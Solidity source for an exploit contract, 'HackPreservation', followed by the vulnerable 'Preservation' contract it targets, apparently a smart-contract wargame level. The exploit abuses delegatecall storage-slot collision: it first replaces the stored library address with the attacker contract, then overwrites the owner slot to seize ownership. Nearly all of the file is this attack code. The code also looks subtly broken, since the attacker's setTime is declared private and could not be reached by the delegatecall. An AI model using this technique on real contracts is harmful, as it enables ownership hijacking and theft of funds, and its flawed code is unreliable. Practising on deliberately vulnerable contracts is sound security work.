// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version


import '../contracts/Preservation.sol';


contract HackPreservation {
    Preservation public originalContract = Preservation(0x9faFb48a78180F26cA51122cAAff74Ca7E056E30);
    // You're going to fill the first two slot with random data
    address notUsed = 0xe0932c2d1544a8fd045E0f5de747A16383127fca;
    address notUsed2 = 0xeB30042FAe605B1280a39748D0020fF43871dc67;
    // The third one it's going to be your address, so you can override the owner variable
    uint toOverride;

    function hack() public {
        // You're gonna set the first library to be this contract
        originalContract.setFirstTime(uint256(uint160(address(this))));
        // Then you're gonna call the function setTime throw the Preservation contract
        originalContract.setFirstTime(uint256(uint160(tx.origin)));
    }

    function setTime(uint _time) private {
        // This way you're overriding the owner slot with your address
        toOverride = _time;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}